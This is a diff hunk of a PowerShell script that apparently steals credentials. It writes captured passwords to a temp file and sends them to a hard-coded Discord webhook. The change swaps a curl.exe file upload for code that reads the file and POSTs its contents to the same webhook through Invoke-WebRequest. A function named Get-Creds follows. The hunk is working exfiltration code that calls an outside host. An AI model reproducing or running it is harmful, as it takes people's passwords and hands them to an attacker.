@@ -51,7 +51,11 @@ $creds = "Password: " + $creds;
 echo $creds >> $env:TMP\$FileName
 $webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
 $SourceFilePath="$env:TMP\$FileName"
-curl.exe -F "file1=@$SourceFilePath" ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE");
+$content = [IO.File]::ReadAllText("$env:TEMP\$FileName");
+$payload = @{
+    content = "```````n$content`n``````"
+}
+Invoke-WebRequest -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
 }
 
 function Get-Creds {
